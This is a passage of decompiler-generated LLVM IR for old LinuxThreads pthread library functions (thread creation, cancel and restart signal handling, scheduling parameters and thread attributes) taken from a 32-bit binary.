  %v0_8058aa7 = load i32, i32* @global_var_8074530.627, align 16
  %tmp18 = icmp slt i32 %v0_8058aa7, 1
  br i1 %tmp18, label %dec_label_pc_8058ad1.preheader, label %dec_label_pc_8058ab0

dec_label_pc_8058ab0:                             ; preds = %dec_label_pc_8058aa7
  store i32 %v0_8058aa7, i32* %stack_var_-188, align 4
  %v1_8058ab4 = call i32 @__GI_raise(i32 %v0_8058aa7)
  %v1_8058ab9 = call i32 @thread_self.7(i32 %v0_8058aa7)
  store i32 %v1_8058ab9, i32* %stack_var_-188, align 4
  %v1_8058ac1 = call i32 @__pthread_wait_for_restart_signal(i32 %v1_8058ab9)
  br label %dec_label_pc_8058ad1.preheader

dec_label_pc_8058ad1.preheader:                   ; preds = %dec_label_pc_8058aa7, %dec_label_pc_8058a76, %dec_label_pc_8058ab0
  %v2_8058ad1 = ptrtoint i32* %stack_var_-160 to i32
  br label %dec_label_pc_8058ad1

dec_label_pc_8058ad1:                             ; preds = %dec_label_pc_8058ad1.preheader, %dec_label_pc_8058aed
  %v0_8058adc = load i32, i32* @global_var_8074524.624, align 4
  store i32 %v0_8058adc, i32* %stack_var_-188, align 4
  %v3_8058ae2 = call i32 @__libc_write(i32 %v0_8058adc, i32 %v2_8058ad1, i32 148)
  %v8_8058aea = icmp eq i32 %v3_8058ae2, -1
  %v1_8058aeb = icmp eq i1 %v8_8058aea, false
  br i1 %v1_8058aeb, label %dec_label_pc_8058af7, label %dec_label_pc_8058aed

dec_label_pc_8058aed:                             ; preds = %dec_label_pc_8058ad1
  %v0_8058aed = load i32, i32* %stack_var_-188, align 4
  %v1_8058aed = call i32 @__errno_location(i32 %v0_8058aed)
  %v1_8058af2 = inttoptr i32 %v1_8058aed to i32*
  %v2_8058af2 = load i32, i32* %v1_8058af2, align 4
  %v11_8058af2 = icmp eq i32 %v2_8058af2, 4
  br i1 %v11_8058af2, label %dec_label_pc_8058ad1, label %dec_label_pc_8058aed.dec_label_pc_8058af7_crit_edge

dec_label_pc_8058aed.dec_label_pc_8058af7_crit_edge: ; preds = %dec_label_pc_8058aed
  br label %dec_label_pc_8058af7

dec_label_pc_8058af7:                             ; preds = %dec_label_pc_8058ad1, %dec_label_pc_8058aed.dec_label_pc_8058af7_crit_edge
  br label %dec_label_pc_8058af9

dec_label_pc_8058af9:                             ; preds = %dec_label_pc_805891c, %dec_label_pc_8058a6b, %dec_label_pc_8058af7
  %v0_8058b00 = phi i32 [ -1, %dec_label_pc_805891c ], [ -1, %dec_label_pc_8058a6b ], [ 0, %dec_label_pc_8058af7 ]
  store i32 %v0_80588fc, i32* @ebx, align 4
  ret i32 %v0_8058b00

; uselistorder directives
  uselistorder i32 %v0_8058aa7, { 0, 3, 2, 1 }
  uselistorder i32 %v0_8058a9d, { 1, 0 }
  uselistorder i32 %v4_80589c7, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8058954, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 11, 12, 13 }
  uselistorder i32 %tmp8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8058af9, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8058af7, { 1, 0 }
  uselistorder label %dec_label_pc_8058ad1, { 1, 0 }
  uselistorder label %dec_label_pc_8058ad1.preheader, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8058a6b, { 1, 0 }
  uselistorder label %dec_label_pc_8058a3e, { 1, 0 }
  uselistorder label %dec_label_pc_8058a08, { 1, 0 }
  uselistorder label %dec_label_pc_8058995, { 1, 0 }
  uselistorder label %dec_label_pc_805891c, { 1, 0 }
}

define i32 @pthread_create() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %v0_8058b01 = load i32, i32* @ebx, align 4
  %v0_8058b08 = load i32, i32* @global_var_8074524.624, align 4
  %v2_8058b08 = icmp slt i32 %v0_8058b08, 0
  %v1_8058b0f = icmp eq i1 %v2_8058b08, false
  br i1 %v1_8058b0f, label %dec_label_pc_8058b23, label %dec_label_pc_8058b11

dec_label_pc_8058b11:                             ; preds = %entry
  %v1_8058b11 = call i32 @__pthread_initialize_manager(i32 %v0_8058b01)
  %v2_8058b1b = icmp slt i32 %v1_8058b11, 0
  br i1 %v2_8058b1b, label %dec_label_pc_8058bab, label %dec_label_pc_8058b23

dec_label_pc_8058b23:                             ; preds = %dec_label_pc_8058b11, %entry
  %v1_8058b23 = call i32 @thread_self.7(i32 %v0_8058b01)
  store i32 %v1_8058b23, i32* %stack_var_-152, align 4
  store i32 %v1_8058b23, i32* @ebx, align 4
  %v2_8058b58 = ptrtoint i32* %stack_var_-132 to i32
  store i32 2, i32* %stack_var_-188, align 4
  %v4_8058b61 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* null, i32 %v2_8058b58)
  %v2_8058b69 = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_8058b69

dec_label_pc_8058b69:                             ; preds = %dec_label_pc_8058b85, %dec_label_pc_8058b23
  %v0_8058b74 = load i32, i32* @global_var_8074524.624, align 4
  store i32 %v0_8058b74, i32* %stack_var_-188, align 4
  %v3_8058b7a = call i32 @__libc_write(i32 %v0_8058b74, i32 %v2_8058b69, i32 148)
  %v8_8058b82 = icmp eq i32 %v3_8058b7a, -1
  %v1_8058b83 = icmp eq i1 %v8_8058b82, false
  br i1 %v1_8058b83, label %dec_label_pc_8058b8f, label %dec_label_pc_8058b85

dec_label_pc_8058b85:                             ; preds = %dec_label_pc_8058b69
  %v0_8058b85 = load i32, i32* %stack_var_-188, align 4
  %v1_8058b85 = call i32 @__errno_location(i32 %v0_8058b85)
  %v1_8058b8a = inttoptr i32 %v1_8058b85 to i32*
  %v2_8058b8a = load i32, i32* %v1_8058b8a, align 4
  %v11_8058b8a = icmp eq i32 %v2_8058b8a, 4
  br i1 %v11_8058b8a, label %dec_label_pc_8058b69, label %dec_label_pc_8058b8f

dec_label_pc_8058b8f:                             ; preds = %dec_label_pc_8058b85, %dec_label_pc_8058b69
  %v0_8058b8f = load i32, i32* @ebx, align 4
  store i32 %v0_8058b8f, i32* @eax, align 4
  %v0_8058b91 = call i32 @suspend.6()
  %v0_8058b96 = load i32, i32* @ebx, align 4
  %v1_8058b96 = add i32 %v0_8058b96, 52
  %v2_8058b96 = inttoptr i32 %v1_8058b96 to i32*
  %v3_8058b96 = load i32, i32* %v2_8058b96, align 4
  %v4_8058b96 = icmp eq i32 %v3_8058b96, 0
  %v1_8058b9a = icmp eq i1 %v4_8058b96, false
  br i1 %v1_8058b9a, label %dec_label_pc_8058ba8, label %dec_label_pc_8058b9c

dec_label_pc_8058b9c:                             ; preds = %dec_label_pc_8058b8f
  %v1_8058ba3 = add i32 %v0_8058b96, 48
  %v2_8058ba3 = inttoptr i32 %v1_8058ba3 to i32*
  %v3_8058ba3 = load i32, i32* %v2_8058ba3, align 4
  %v2_8058ba6 = inttoptr i32 %tmp to i32*
  store i32 %v3_8058ba3, i32* %v2_8058ba6, align 4
  %v0_8058ba8.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8058ba8

dec_label_pc_8058ba8:                             ; preds = %dec_label_pc_8058b8f, %dec_label_pc_8058b9c
  %v0_8058ba8 = phi i32 [ %v0_8058b96, %dec_label_pc_8058b8f ], [ %v0_8058ba8.pre, %dec_label_pc_8058b9c ]
  %v1_8058ba8 = add i32 %v0_8058ba8, 52
  %v2_8058ba8 = inttoptr i32 %v1_8058ba8 to i32*
  %v3_8058ba8 = load i32, i32* %v2_8058ba8, align 4
  br label %dec_label_pc_8058bab

dec_label_pc_8058bab:                             ; preds = %dec_label_pc_8058b11, %dec_label_pc_8058ba8
  %v0_8058bab = phi i32 [ 11, %dec_label_pc_8058b11 ], [ %v3_8058ba8, %dec_label_pc_8058ba8 ]
  store i32 %v0_8058b01, i32* @ebx, align 4
  ret i32 %v0_8058bab

; uselistorder directives
  uselistorder i32 %v0_8058b01, { 1, 0, 2 }
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder label %dec_label_pc_8058bab, { 1, 0 }
  uselistorder label %dec_label_pc_8058ba8, { 1, 0 }
}

define i32 @__pthread_initialize() local_unnamed_addr {
entry:
  %v1_8058bb5 = call i32 @pthread_initialize(i32 ptrtoint (i32* @0 to i32))
  ret i32 %v1_8058bb5

; uselistorder directives
  uselistorder i32 (i32)* @pthread_initialize, { 1, 0 }
}

define i32 @pthread_handle_sigcancel(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8058bba = load i32, i32* @ebx, align 4
  store i32 %v0_8058bba, i32* %stack_var_-4, align 4
  %v4_8058bba = ptrtoint i32* %stack_var_-4 to i32
  %v1_8058bbe = call i32 @thread_self.7(i32 %v0_8058bba)
  store i32 %v1_8058bbe, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v6_8058bc7 = icmp eq i32 %v1_8058bbe, 134693696
  %v1_8058bcc = icmp eq i1 %v6_8058bc7, false
  br i1 %v1_8058bcc, label %dec_label_pc_8058bda, label %dec_label_pc_8058bce

dec_label_pc_8058bce:                             ; preds = %entry
  %v2_8058bd2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8058bd2, i32* %eax.global-to-local, align 4
  %v2_8058bd4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8058bd4, i32* @ebx, align 4
  %v1_8058bd5 = call i32 @__pthread_manager_sighandler(i32 %arg1)
  store i32 %v1_8058bd5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8058bda

dec_label_pc_8058bda:                             ; preds = %entry, %dec_label_pc_8058bce
  %v0_8058c21 = phi i32 [ %v1_8058bbe, %entry ], [ %v1_8058bd5, %dec_label_pc_8058bce ]
  %v0_8058bda = load i32, i32* @global_var_8078e78.640, align 8
  %v1_8058bda = icmp eq i32 %v0_8058bda, 0
  br i1 %v1_8058bda, label %dec_label_pc_8058c0f, label %dec_label_pc_8058be3

dec_label_pc_8058be3:                             ; preds = %dec_label_pc_8058bda
  %v1_8058be3 = load i32, i32* bitcast (i32** @global_var_8074520.625 to i32*), align 32
  %v12_8058be3 = icmp eq i32 %v0_8058c21, %v1_8058be3
  %v1_8058be9 = icmp eq i1 %v12_8058be3, false
  br i1 %v1_8058be9, label %dec_label_pc_8058be3.dec_label_pc_8058c01_crit_edge, label %dec_label_pc_8058beb

dec_label_pc_8058be3.dec_label_pc_8058c01_crit_edge: ; preds = %dec_label_pc_8058be3
  br label %dec_label_pc_8058c01

dec_label_pc_8058beb:                             ; preds = %dec_label_pc_8058be3
  %v0_8058bf3 = load i32, i32* @global_var_8074354.621, align 4
  %v4_8058bf9 = call i32 @waitpid(i32 %v0_8058bf3, i32 0, i32 -2147483648, i32 %v0_8058c21)
  store i32 %v4_8058bf9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8058c01

dec_label_pc_8058c01:                             ; preds = %dec_label_pc_8058be3.dec_label_pc_8058c01_crit_edge, %dec_label_pc_8058beb
  %v0_8058c04 = load i32, i32* @global_var_8078e7c.641, align 4
  %v1_8058c0a = call i32 @__GI__exit(i32 %v0_8058c04)
  unreachable

dec_label_pc_8058c0f:                             ; preds = %dec_label_pc_8058bda
  %v1_8058c0f = add i32 %v0_8058c21, 66
  %v2_8058c0f = inttoptr i32 %v1_8058c0f to i8*
  %v3_8058c0f = load i8, i8* %v2_8058c0f, align 1
  %v4_8058c0f = icmp eq i8 %v3_8058c0f, 0
  br i1 %v4_8058c0f, label %dec_label_pc_8058c47, label %dec_label_pc_8058c15

dec_label_pc_8058c15:                             ; preds = %dec_label_pc_8058c0f
  %v1_8058c15 = add i32 %v0_8058c21, 64
  %v2_8058c15 = inttoptr i32 %v1_8058c15 to i8*
  %v3_8058c15 = load i8, i8* %v2_8058c15, align 1
  %v4_8058c15 = icmp eq i8 %v3_8058c15, 0
  %v1_8058c19 = icmp eq i1 %v4_8058c15, false
  br i1 %v1_8058c19, label %dec_label_pc_8058c47, label %dec_label_pc_8058c1b

dec_label_pc_8058c1b:                             ; preds = %dec_label_pc_8058c15
  %v1_8058c1b = add i32 %v0_8058c21, 65
  %v2_8058c1b = inttoptr i32 %v1_8058c1b to i8*
  %v3_8058c1b = load i8, i8* %v2_8058c1b, align 1
  %v12_8058c1b = icmp eq i8 %v3_8058c1b, 1
  %v1_8058c1f = icmp eq i1 %v12_8058c1b, false
  br i1 %v1_8058c1f, label %dec_label_pc_8058c2f, label %dec_label_pc_8058c21

dec_label_pc_8058c21:                             ; preds = %dec_label_pc_8058c1b
  store i32 %v4_8058bba, i32* %eax.global-to-local, align 4
  %v2_8058c2a = call i32 @__pthread_do_exit(i32 -1, i32 %v4_8058bba)
  store i32 %v2_8058c2a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8058c2f

dec_label_pc_8058c2f:                             ; preds = %dec_label_pc_8058c1b, %dec_label_pc_8058c21
  %stack_var_-24.0 = phi i32 [ %tmp10, %dec_label_pc_8058c1b ], [ %v4_8058bba, %dec_label_pc_8058c21 ]
  %v0_8058c36 = phi i32 [ %v0_8058c21, %dec_label_pc_8058c1b ], [ %v2_8058c2a, %dec_label_pc_8058c21 ]
  %v1_8058c2f = add i32 %v0_8058c36, 40
  %v2_8058c2f = inttoptr i32 %v1_8058c2f to i32*
  %v3_8058c2f = load i32, i32* %v2_8058c2f, align 4
  store i32 %v3_8058c2f, i32* @edx, align 4
  %v1_8058c32 = icmp eq i32 %v3_8058c2f, 0
  br i1 %v1_8058c32, label %dec_label_pc_8058c47, label %dec_label_pc_8058c36

dec_label_pc_8058c36:                             ; preds = %dec_label_pc_8058c2f
  store i32 0, i32* %v2_8058c2f, align 4
  %v0_8058c3d = load i32, i32* %eax.global-to-local, align 4
  %v4_8058c42 = call i32 @siglongjmp(i32 %v3_8058c2f, i32 1, i32 %v0_8058c3d, i32 %v0_8058c3d)
  store i32 %v4_8058c42, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8058c47

dec_label_pc_8058c47:                             ; preds = %dec_label_pc_8058c2f, %dec_label_pc_8058c15, %dec_label_pc_8058c0f, %dec_label_pc_8058c36
  %stack_var_-24.1 = phi i32 [ %tmp10, %dec_label_pc_8058c0f ], [ %tmp10, %dec_label_pc_8058c15 ], [ %stack_var_-24.0, %dec_label_pc_8058c2f ], [ %stack_var_-24.0, %dec_label_pc_8058c36 ]
  store i32 %stack_var_-24.1, i32* %eax.global-to-local, align 4
  ret i32 %stack_var_-24.1

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 1, 0 }
  uselistorder i32 %v0_8058c21, { 1, 2, 3, 5, 4, 0 }
  uselistorder i32 %v1_8058bbe, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 %tmp10, { 1, 2, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 7, 3, 4, 5, 0, 6, 8 }
  uselistorder label %dec_label_pc_8058c47, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8058c2f, { 1, 0 }
  uselistorder label %dec_label_pc_8058c01, { 1, 0 }
  uselistorder label %dec_label_pc_8058bda, { 1, 0 }
}

define i32 @pthread_handle_sigrestart(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8058c4e = call i32 @thread_self.7(i32 ptrtoint (i32* @0 to i32))
  store i32 %arg1, i32* @edx, align 4
  %v2_8058c57 = add i32 %v1_8058c4e, 32
  %v3_8058c57 = inttoptr i32 %v2_8058c57 to i32*
  store i32 %arg1, i32* %v3_8058c57, align 4
  %v1_8058c5a = add i32 %v1_8058c4e, 36
  %v2_8058c5a = inttoptr i32 %v1_8058c5a to i32*
  %v3_8058c5a = load i32, i32* %v2_8058c5a, align 4
  %v1_8058c5d = icmp eq i32 %v3_8058c5a, 0
  br i1 %v1_8058c5d, label %dec_label_pc_8058c6b, label %dec_label_pc_8058c61

dec_label_pc_8058c61:                             ; preds = %entry
  %v0_8058c61 = load i32, i32* @ecx, align 4
  %v4_8058c66 = call i32 @siglongjmp(i32 %v3_8058c5a, i32 1, i32 %v0_8058c61, i32 %v0_8058c61)
  br label %dec_label_pc_8058c6b

dec_label_pc_8058c6b:                             ; preds = %entry, %dec_label_pc_8058c61
  %v0_8058c6e = phi i32 [ 0, %entry ], [ %v4_8058c66, %dec_label_pc_8058c61 ]
  ret i32 %v0_8058c6e

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @siglongjmp, { 1, 0 }
  uselistorder i32 (i32)* @thread_self.7, { 6, 5, 3, 2, 1, 0, 4 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8058c6b, { 1, 0 }
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v1_8058c74 = call i32 @__libc_pthread_init(i32 0)
  store i32 %v1_8058c74, i32* @global_var_8078e80.669, align 128
  ret i32 %v1_8058c74
}

define i32 @pthread_setschedparam(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg3 to i32
  %v0_8058c85 = load i32, i32* @ebx, align 4
  store i32 0, i32* @edx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8058c95 = urem i32 %arg1, 1024
  %v2_8058c9a = mul nuw nsw i32 %v1_8058c95, 16
  %v1_8058c9d = add i32 %v2_8058c9a, ptrtoint (i32* @global_var_8070140.628 to i32)
  store i32 %v1_8058c9d, i32* @esi, align 4
  store i32 %v1_8058c9d, i32* @eax, align 4
  %v1_8058ca5 = call i32 @__pthread_lock(i32 %v0_8058c85)
  %v0_8058caa = load i32, i32* @esi, align 4
  %v1_8058caa = add i32 %v0_8058caa, 8
  %v2_8058caa = inttoptr i32 %v1_8058caa to i32*
  %v3_8058caa = load i32, i32* %v2_8058caa, align 4
  store i32 %v3_8058caa, i32* @ebx, align 4
  %v1_8058cad = icmp eq i32 %v3_8058caa, 0
  br i1 %v1_8058cad, label %dec_label_pc_8058cb6, label %dec_label_pc_8058cb1

dec_label_pc_8058cb1:                             ; preds = %entry
  %v1_8058cb1 = add i32 %v3_8058caa, 16
  %v2_8058cb1 = inttoptr i32 %v1_8058cb1 to i32*
  %v3_8058cb1 = load i32, i32* %v2_8058cb1, align 4
  %v4_8058cb1 = load i32, i32* @edi, align 4
  %v15_8058cb1 = icmp eq i32 %v3_8058cb1, %v4_8058cb1
  br i1 %v15_8058cb1, label %dec_label_pc_8058cc6, label %dec_label_pc_8058cb6

dec_label_pc_8058cb6:                             ; preds = %dec_label_pc_8058cb1, %entry
  %v1_8058cba = inttoptr i32 %v0_8058caa to i32*
  %v2_8058cba = call i32 @__pthread_unlock(i32* %v1_8058cba)
  br label %dec_label_pc_8058d1f

dec_label_pc_8058cc6:                             ; preds = %dec_label_pc_8058cb1
  %v1_8058ccc = add i32 %v3_8058caa, 20
  %v2_8058ccc = inttoptr i32 %v1_8058ccc to i32*
  %v3_8058ccc = load i32, i32* %v2_8058ccc, align 4
  %v3_8058ccf = call i32 @sched_setscheduler(i32 %v3_8058ccc, i32 %tmp5, i32 %v4_8058cb1)
  %v8_8058cd7 = icmp eq i32 %v3_8058ccf, -1
  %v1_8058cd8 = icmp eq i1 %v8_8058cd7, false
  br i1 %v1_8058cd8, label %dec_label_pc_8058cec, label %dec_label_pc_8058cda

dec_label_pc_8058cda:                             ; preds = %dec_label_pc_8058cc6
  %v0_8058cdd = load i32, i32* @esi, align 4
  %v1_8058cde = inttoptr i32 %v0_8058cdd to i32*
  %v2_8058cde = call i32 @__pthread_unlock(i32* %v1_8058cde)
  %v1_8058ce3 = call i32 @__errno_location(i32 %v0_8058cdd)
  %v1_8058ce8 = inttoptr i32 %v1_8058ce3 to i32*
  %v2_8058ce8 = load i32, i32* %v1_8058ce8, align 4
  br label %dec_label_pc_8058d1f

dec_label_pc_8058cec:                             ; preds = %dec_label_pc_8058cc6
  %v1_8058cee = icmp eq i32 %arg2, 0
  br i1 %v1_8058cee, label %dec_label_pc_8058cf8, label %dec_label_pc_8058cf2

dec_label_pc_8058cf2:                             ; preds = %dec_label_pc_8058cec
  %v2_8058cf6 = load i32, i32* %arg3, align 4
  br label %dec_label_pc_8058cf8

dec_label_pc_8058cf8:                             ; preds = %dec_label_pc_8058cec, %dec_label_pc_8058cf2
  %v0_8058cfb = phi i32 [ 0, %dec_label_pc_8058cec ], [ %v2_8058cf6, %dec_label_pc_8058cf2 ]
  %v2_8058cfb = add i32 %v3_8058caa, 24
  %v3_8058cfb = inttoptr i32 %v2_8058cfb to i32*
  store i32 %v0_8058cfb, i32* %v3_8058cfb, align 4
  %v0_8058cfe = load i32, i32* @esi, align 4
  %v1_8058cff = inttoptr i32 %v0_8058cfe to i32*
  %v2_8058cff = call i32 @__pthread_unlock(i32* %v1_8058cff)
  %v0_8058d09 = load i32, i32* @global_var_8074524.624, align 4
  %v2_8058d09 = icmp slt i32 %v0_8058d09, 0
  br i1 %v2_8058d09, label %dec_label_pc_8058d22, label %dec_label_pc_8058d12

dec_label_pc_8058d12:                             ; preds = %dec_label_pc_8058cf8
  %v3_8058d15 = load i32, i32* %v3_8058cfb, align 4
  %v1_8058d18 = call i32 @__pthread_manager_adjust_prio(i32 %v3_8058d15)
  br label %dec_label_pc_8058d1f

dec_label_pc_8058d1f:                             ; preds = %dec_label_pc_8058cda, %dec_label_pc_8058cb6, %dec_label_pc_8058d12
  %v0_8058d294 = phi i32 [ %v2_8058ce8, %dec_label_pc_8058cda ], [ 3, %dec_label_pc_8058cb6 ], [ 0, %dec_label_pc_8058d12 ]
  br label %dec_label_pc_8058d22

dec_label_pc_8058d22:                             ; preds = %dec_label_pc_8058cf8, %dec_label_pc_8058d1f
  %v0_8058d29 = phi i32 [ 0, %dec_label_pc_8058cf8 ], [ %v0_8058d294, %dec_label_pc_8058d1f ]
  ret i32 %v0_8058d29

; uselistorder directives
  uselistorder i32 %v4_8058cb1, { 1, 0 }
  uselistorder i32 %v3_8058caa, { 2, 1, 0, 3, 4 }
  uselistorder i32 (i32)* @__pthread_manager_adjust_prio, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8058d22, { 1, 0 }
  uselistorder label %dec_label_pc_8058d1f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8058cf8, { 1, 0 }
}

define i32 @__GI_pthread_getschedparam(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_8058d2b = load i32, i32* @ebx, align 4
  store i32 0, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_8058d37 = urem i32 %arg1, 1024
  %v2_8058d3c = mul nuw nsw i32 %v1_8058d37, 16
  %v1_8058d3f = add i32 %v2_8058d3c, ptrtoint (i32* @global_var_8070140.628 to i32)
  store i32 %v1_8058d3f, i32* @ebx, align 4
  store i32 %v1_8058d3f, i32* @eax, align 4
  %v1_8058d47 = call i32 @__pthread_lock(i32 %v0_8058d2b)
  %v0_8058d4c = load i32, i32* @ebx, align 4
  %v1_8058d4c = add i32 %v0_8058d4c, 8
  %v2_8058d4c = inttoptr i32 %v1_8058d4c to i32*
  %v3_8058d4c = load i32, i32* %v2_8058d4c, align 4
  %v1_8058d4f = icmp eq i32 %v3_8058d4c, 0
  br i1 %v1_8058d4f, label %dec_label_pc_8058d58, label %dec_label_pc_8058d53

dec_label_pc_8058d53:                             ; preds = %entry
  %v1_8058d53 = add i32 %v3_8058d4c, 16
  %v2_8058d53 = inttoptr i32 %v1_8058d53 to i32*
  %v3_8058d53 = load i32, i32* %v2_8058d53, align 4
  %v4_8058d53 = load i32, i32* @esi, align 4
  %v15_8058d53 = icmp eq i32 %v3_8058d53, %v4_8058d53
  br i1 %v15_8058d53, label %dec_label_pc_8058d6b, label %dec_label_pc_8058d58

dec_label_pc_8058d58:                             ; preds = %dec_label_pc_8058d53, %entry
  store i32 %v0_8058d4c, i32* %stack_var_-28, align 4
  %v1_8058d5c = inttoptr i32 %v0_8058d4c to i32*
  %v2_8058d5c = call i32 @__pthread_unlock(i32* %v1_8058d5c)
  br label %dec_label_pc_8058dac

dec_label_pc_8058d6b:                             ; preds = %dec_label_pc_8058d53
  %v1_8058d6e = add i32 %v3_8058d4c, 20
  %v2_8058d6e = inttoptr i32 %v1_8058d6e to i32*
  %v3_8058d6e = load i32, i32* %v2_8058d6e, align 4
  store i32 %v3_8058d6e, i32* @esi, align 4
  store i32 %v0_8058d4c, i32* %stack_var_-28, align 4
  %v1_8058d72 = inttoptr i32 %v0_8058d4c to i32*
  %v2_8058d72 = call i32 @__pthread_unlock(i32* %v1_8058d72)
  %v0_8058d77 = load i32, i32* @esi, align 4
  store i32 %v0_8058d77, i32* %stack_var_-28, align 4
  %v1_8058d7a = call i32 @sched_getscheduler(i32 %v0_8058d77)
  store i32 %v1_8058d7a, i32* @ebx, align 4
  %v10_8058d84 = icmp eq i32 %v1_8058d7a, -1
  br i1 %v10_8058d84, label %dec_label_pc_8058d9b, label %dec_label_pc_8058d89

dec_label_pc_8058d89:                             ; preds = %dec_label_pc_8058d6b
  %v0_8058d89 = load i32, i32* @ecx, align 4
  %v0_8058d8f = load i32, i32* @esi, align 4
  store i32 %v0_8058d8f, i32* %stack_var_-28, align 4
  %v4_8058d90 = call i32 @sched_getparam(i32 %v0_8058d8f, i32 %arg3, i32 %v0_8058d89, i32 %v0_8058d89)
  %v8_8058d98 = icmp eq i32 %v4_8058d90, -1
  %v1_8058d99 = icmp eq i1 %v8_8058d98, false
  br i1 %v1_8058d99, label %dec_label_pc_8058da4, label %dec_label_pc_8058d9b

dec_label_pc_8058d9b:                             ; preds = %dec_label_pc_8058d89, %dec_label_pc_8058d6b
  %v0_8058d9b = load i32, i32* %stack_var_-28, align 4
  %v1_8058d9b = call i32 @__errno_location(i32 %v0_8058d9b)
  %v1_8058da0 = inttoptr i32 %v1_8058d9b to i32*
  %v2_8058da0 = load i32, i32* %v1_8058da0, align 4
  br label %dec_label_pc_8058dac

dec_label_pc_8058da4:                             ; preds = %dec_label_pc_8058d89
  %v0_8058da8 = load i32, i32* @ebx, align 4
  store i32 %v0_8058da8, i32* %arg2, align 4
  br label %dec_label_pc_8058dac

dec_label_pc_8058dac:                             ; preds = %dec_label_pc_8058d9b, %dec_label_pc_8058d58, %dec_label_pc_8058da4
  %v0_8058daf = phi i32 [ %v2_8058da0, %dec_label_pc_8058d9b ], [ 3, %dec_label_pc_8058d58 ], [ 0, %dec_label_pc_8058da4 ]
  ret i32 %v0_8058daf

; uselistorder directives
  uselistorder i32 %v0_8058d4c, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_8058dac, { 2, 0, 1 }
}

define i32 @pthread_attr_destroy() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__GI_pthread_attr_setdetachstate(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = or i32 %arg2, 1
  %tmp4 = icmp eq i32 %tmp3, 1
  br i1 %tmp4, label %dec_label_pc_8058dc1, label %dec_label_pc_8058dc9

dec_label_pc_8058dc1:                             ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_8058dc9

dec_label_pc_8058dc9:                             ; preds = %entry, %dec_label_pc_8058dc1
  %v0_8058dc9 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_8058dc1 ]
  ret i32 %v0_8058dc9

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8058dc9, { 1, 0 }
}

define i32 @__GI_pthread_attr_getdetachstate(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_8058dce = load i32, i32* %arg1, align 4
  %v2_8058dd4 = inttoptr i32 %arg2 to i32*
  store i32 %v2_8058dce, i32* %v2_8058dd4, align 4
  ret i32 0
}

define i32 @__GI_pthread_attr_setschedpolicy(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v6_8058de5 = icmp ugt i32 %arg2, 2
  br i1 %v6_8058de5, label %dec_label_pc_8058df0, label %dec_label_pc_8058de7

dec_label_pc_8058de7:                             ; preds = %entry
  %v2_8058deb = add i32 %arg1, 4
  %v3_8058deb = inttoptr i32 %v2_8058deb to i32*
  store i32 %arg2, i32* %v3_8058deb, align 4
  br label %dec_label_pc_8058df0

dec_label_pc_8058df0:                             ; preds = %entry, %dec_label_pc_8058de7
  %v0_8058df0 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_8058de7 ]
  ret i32 %v0_8058df0

; uselistorder directives
  uselistorder label %dec_label_pc_8058df0, { 1, 0 }
}

define i32 @pthread_attr_getschedpolicy(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_8058df5 = add i32 %arg1, 4
  %v2_8058df5 = inttoptr i32 %v1_8058df5 to i32*
  %v3_8058df5 = load i32, i32* %v2_8058df5, align 4
  store i32 %v3_8058df5, i32* %arg2, align 4
  ret i32 0
}

define i32 @pthread_attr_setinheritsched(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = or i32 %arg2, 1
  %tmp4 = icmp eq i32 %tmp3, 1
  br i1 %tmp4, label %dec_label_pc_8058e0f, label %dec_label_pc_8058e18

dec_label_pc_8058e0f:                             ; preds = %entry
  %v2_8058e13 = add i32 %arg1, 12
  %v3_8058e13 = inttoptr i32 %v2_8058e13 to i32*
  store i32 %arg2, i32* %v3_8058e13, align 4
